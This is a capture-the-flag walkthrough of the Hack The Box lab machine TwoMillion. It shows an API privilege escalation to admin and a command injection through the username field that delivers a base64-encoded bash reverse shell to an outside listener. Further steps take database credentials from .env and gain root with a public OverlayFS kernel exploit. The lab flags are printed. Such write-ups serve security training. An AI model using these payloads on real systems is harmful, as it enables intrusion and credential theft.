---
title: "TwoMillion from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# TwoMillion from HTB
[page](https://app.hackthebox.com/machines/TwoMillion)
`Nmap` gave this:
```
$ nmap -sCV --min-rate 4000 -Pn 10.10.11.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 21:16 +04
Nmap scan report for 2million.htb (10.10.11.221)
Host is up (0.23s latency).
Not shown: 918 filtered tcp ports (no-response), 80 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Hack The Box :: Penetration Testing Labs
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.02 seconds
```
Nothing unusual.
Go to site and you can see that it is old `HTB`site which was vulnerable. You can search `HTB invite code exploit`and do that.
Open http://2million.htb/invite and `Inspect`it. There is `Invite`code, copy that and go to [de4js](https://lelinhtinh.github.io/de4js/)and paste the copied code. Then click `Auto Decode`:
```
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```
There is a given directory `/api/v1/invite/how/to/generate`. Use that to `curl`the things inside that directory of the `2million.htb` and read it:
```
$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```
Copy the text and search `ROT13`Decrypt and do it. You will get this:
```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```
Do as it says in the text:
```
$ curl -sX POST http://2million.htb/api/v1/invite/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "UFdENTYtQUtMNFUtV0pCMEgtVVlYS1A=",
    "format": "encoded"
  }
}
```
From the looks of it, it's `base64`and decrypt it:
```
$ echo "UFdENTYtQUtMNFUtV0pCMEgtVVlYS1A=" | base64 -d
PWD56-AKL4U-WJB0H-UYXKP
```
This is the token for the registration.
Go to `2million.htb/invite`and paste the invitation code. Then sign up.
You are greeted with this page:
![scree](/assets/images/Screenshot from 2024-08-06 23-57-07.png)
There isn't much of pages you can open, but there is one interesting: `Access`.
The Access page allows a user to Download and Regenerate their `VPN` file to be able to access the `HTB`infrastructure. Let's fire up `BurpSuite` and see what the `Connection Pack` download button does.
In `BurpSuite`turn the `Intercept`button on and click the `Connection Pack`button, in `Burp`you will get this:
```
GET /api/v1/user/vpn/generate HTTP/1.1
Host: 2million.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
Connection: keep-alive
```
You can see the cookie that we'll use for `curl`.
```
$ curl -sv http://2million.htb/api --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" | jq
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.8.0
> Accept: */*
> Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Tue, 06 Aug 2024 17:47:06 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
<
{ [47 bytes data]
* Connection #0 to host 2million.htb left intact
{
  "/api/v1": "Version 1 of the API"
}
```
This is what `curling` `/api`gives. Now we have to `curl /api/v1`:
```
$ curl -sv http://2million.htb/api/v1 --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" | jq
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> GET /api/v1 HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.8.0
> Accept: */*
> Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Tue, 06 Aug 2024 17:48:06 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
<
{ [812 bytes data]
* Connection #0 to host 2million.htb left intact
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```
This is the directories of `2million.htb`that we will use.
```
$ curl -sv http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" | jq
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> GET /api/v1/admin/auth HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.8.0
> Accept: */*
> Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Tue, 06 Aug 2024 17:48:36 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
<
{ [28 bytes data]
* Connection #0 to host 2million.htb left intact
{
  "message": false
}
```
`curl-ing`the `/api/v1/admin/auth` gave us the `false`because we are not admin.
```
$ curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" | jq
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> POST /api/v1/admin/vpn/generate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.8.0
> Accept: */*
> Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
>
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Tue, 06 Aug 2024 18:24:42 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
<
{ [5 bytes data]
* Connection #0 to host 2million.htb left intact
```
Here we get `401 Unauthorized`. We have to become the admin.
```
$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.8.0
> Accept: */*
> Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
>
* Request completely sent off
  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0< HTTP/1.1 200 OK
< Server: nginx
< Date: Tue, 06 Aug 2024 18:34:19 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
<
{ [64 bytes data]
100    53    0    53    0     0     33      0 --:--:--  0:00:01 --:--:--    33
* Connection #0 to host 2million.htb left intact
{
  "status": "danger",
  "message": "Invalid content type."
}
```
Ignore the `danger`we have to change the second error, with Header
```
$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" --header "Content-Type: application/json" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.8.0
> Accept: */*
> Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
> Content-Type: application/json
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Tue, 06 Aug 2024 18:43:42 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
<
{ [67 bytes data]
100    56    0    56    0     0     49      0 --:--:--  0:00:01 --:--:--    49
* Connection #0 to host 2million.htb left intact
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```
It worked but now we are missing the `email`parameter. with `--data` add the `email`parameter:
```
$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" --header "Content-Type: application/json" --data '{"email":"test@test.com"}' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.8.0
> Accept: */*
> Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
> Content-Type: application/json
> Content-Length: 25
>
} [25 bytes data]
* upload completely sent off: 25 bytes
< HTTP/1.1 200 OK
< Server: nginx
< Date: Tue, 06 Aug 2024 18:45:00 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
<
{ [70 bytes data]
100    84    0    59  100    25     72     30 --:--:-- --:--:-- --:--:--   102
* Connection #0 to host 2million.htb left intact
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```
Now we need the `is_admin`parameter:
```
$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" --header "Content-Type: application/json" --data '{"email":"test@test.com", "is_admin": 1 }' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.8.0
> Accept: */*
> Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
> Content-Type: application/json
> Content-Length: 41
>
} [41 bytes data]
* upload completely sent off: 41 bytes
< HTTP/1.1 200 OK
< Server: nginx
< Date: Tue, 06 Aug 2024 18:45:51 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
<
{ [55 bytes data]
100    85    0    44  100    41     50     47 --:--:-- --:--:-- --:--:--    97
* Connection #0 to host 2million.htb left intact
{
  "id": 13,
  "username": "shavigio",
  "is_admin": 1
}
```
We are admin  now.
```
$ curl -sv http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" --header "Content-Type: application/json" --data '{"username" :"shavigio"}'
```
This will provide `vpn`for admin and it is long `ahh` text maybe not worth reading `IDK`.
```
$ curl -sv http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" --header "Content-Type: application/json" --data '{"username" :"shavigio;id;"}'

uid=33(www-data) gid=33(www-data) groups=33(www-data)
* Connection #0 to host 2million.htb left intact
```
This means we can execute commands here.
Logically we can use this for `NetCat`connection. Go to [revshells](https://www.revshells.com/) and use the `bash -i`code. Enter your `IP`and `Port`, Copy that and encode that with `base64`, Then execute this command:
```
nc -nlvp <port> # in other terminal
$ curl -sv http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" --header "Content-Type: application/json" --data '{"username" :"shavigio;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy8xMjM0IDA+JjEK |base64 -d |bash;"}'
```
That will give us the connection on `NetCat`.
```
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.221] 35764
sh: 0: can't access tty; job control turned off
$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Aug  6 20:20 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Aug  6 20:20 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
Go to `ssh`and use that credentials:
```
ssh admin@10.10.11.221
Password:SuperDuperPass123
```
***
And you can `cat`the `user.txt`:b165c7aa079232172893c8fa3c8f2123
***
We can't execute any commands with root's permission:
```
$ sudo -l
[sudo] password for admin:
Sorry, try again.
[sudo] password for admin:
Sorry, user admin may not run sudo on localhost.
```
This means that there is some exploit we need to find. Since the site is in `/var`directory i went to that and there was `/mail`directory:
```
$ cd /var
admin@2million:/var$ ls
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
admin@2million:/var$ cd mail
admin@2million:/var/mail$ ls
admin
admin@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```
Here we go, there is named the exploit.
```
admin@2million:/var/mail$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```
`uname -a`tells us that `kernel`version is `5.15.70` There is exploits on that.
Searching to that brought me to`Github`repository.
```
git clone https://github.com/xkaneiki/CVE-2023-0386
Cloning into 'CVE-2023-0386'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 24 (delta 7), reused 21 (delta 5), pack-reused 0
Receiving objects: 100% (24/24), 426.11 KiB | 360.00 KiB/s, done.
Resolving deltas: 100% (7/7), done.
```
I zipped it so it would be easier to transfer it to the machine, and i used `scp`to move it:
```
zip -r cve.zip CVE-2023-0386/
scp cve.zip admin@2million.htb:/tmp
The authenticity of host '2million.htb (10.10.11.221)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:69: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '2million.htb' (ED25519) to the list of known hosts.
admin@2million.htb's password:
cve.zip
```
Unzip the copied file, go to directory and run the code:
```
./fuse ./ovlcap/lower ./gc &
```
`&`because it needs to be running in the background.
and Then:
```
./exp
```
Running the last command will make you the `root`and then you can see the `root flag`
```
root@2million:/tmp/CVE-2023-0386# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)
root@2million:/tmp/CVE-2023-0386# cat /root/root.txt
e688bd39f1e4405adc18fdc720bf21d8
```
***
root flag: e688bd39f1e4405adc18fdc720bf21d8
***
![screen](/assets/images/Screenshot from 2024-08-06 23-38-27.png)
